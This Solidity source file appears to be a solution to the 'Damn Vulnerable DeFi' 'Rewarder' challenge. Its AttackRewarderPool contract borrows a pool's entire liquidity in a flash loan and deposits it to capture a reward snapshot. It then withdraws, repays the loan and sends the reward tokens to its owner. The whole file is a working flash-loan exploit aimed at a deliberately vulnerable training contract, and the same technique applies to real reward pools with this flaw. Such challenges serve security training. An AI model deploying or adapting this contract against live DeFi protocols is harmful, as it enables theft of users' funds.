// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackRewarderPool {
    FlashLoanerPool public flashLoanPool;
    DamnValuableToken public liquidityToken;
    TheRewarderPool public rewardPool;

    address private rewardToken;
    address private owner;

    constructor(
        address _pool,
        address _liquidityToken,
        address _rewardPool,
        address _rewardTokenAddress
    ) {
        flashLoanPool = FlashLoanerPool(_pool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = _rewardTokenAddress;
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        // set reward pool allowance
        liquidityToken.approve(address(rewardPool), amount);
        // deposit, and distributeRewards
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();

        // withdraw liquidity tokens to pay back Flashloan
        rewardPool.withdraw(amount);

        // Return tokens from Flashloan
        liquidityToken.transfer(msg.sender, amount);

        // send rewardToken balance to EOA
        uint256 rewardsBalance = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(owner, rewardsBalance);
    }

    function execute() external {
        // get liquidity token balance of pool
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        // flash loan with entore pool
        flashLoanPool.flashLoan(amount);
    }
}
